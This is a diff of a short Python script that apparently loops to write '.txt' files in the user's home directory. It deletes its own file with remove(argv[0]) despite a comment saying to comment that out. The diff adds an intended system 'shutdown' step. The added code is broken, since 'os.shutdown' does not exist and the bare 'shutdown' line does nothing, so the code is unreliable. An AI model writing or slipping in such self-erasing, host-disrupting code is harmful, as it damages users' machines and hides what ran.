@@ -4,6 +4,7 @@
 import os
 from os import remove
 from sys import argv
+from os import shutdown
 from os.path import expanduser
 from os.path import join
 extension = str(".txt")
@@ -16,4 +17,4 @@ for i in range(100):
 
 #comment out deleting self
 remove(argv[0])
-
+shutdown
